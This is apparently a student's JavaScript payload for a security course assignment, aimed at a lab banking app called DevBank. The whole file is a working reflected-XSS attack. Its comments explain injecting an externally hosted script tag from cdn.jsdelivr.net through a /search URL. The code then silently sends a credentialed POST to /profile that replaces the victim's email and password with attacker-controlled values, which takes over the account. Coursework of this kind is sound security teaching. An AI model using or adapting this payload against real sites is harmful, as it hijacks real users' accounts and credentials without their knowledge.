// FIT5003 A2 - Part B.2: externally-hosted reflected-XSS payload.
//
// Delivery: the victim (logged in to DevBank) opens a crafted /search URL that
// injects  <script src="https://cdn.jsdelivr.net/gh/<you>/<repo>@<branch>/payload.js"></script>
// into the reflected sink. Because this script then runs INSIDE the DevBank
// origin and in the victim's authenticated session, fetch() below is a
// same-origin request that automatically carries the victim's "auth" cookie.
//
// Impact: account takeover. We overwrite the victim's email AND password via the
// existing /profile POST, so the attacker can later log in and/or do a password
// reset to the attacker-controlled email. (Change these to your own demo values.)

(function () {
  var ATTACKER_EMAIL = "pwned@attacker.example";
  var ATTACKER_PASSWORD = "Pwned-By-XSS-2026!";

  var body = "email=" + encodeURIComponent(ATTACKER_EMAIL) +
             "&password=" + encodeURIComponent(ATTACKER_PASSWORD);

  fetch("/profile", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    credentials: "include",      // send the victim's session cookie
    body: body
  }).then(function () {
    // Optional: visible proof the payload ran during the live demo.
    console.log("[payload] profile overwritten for current DevBank user");
  });
})();
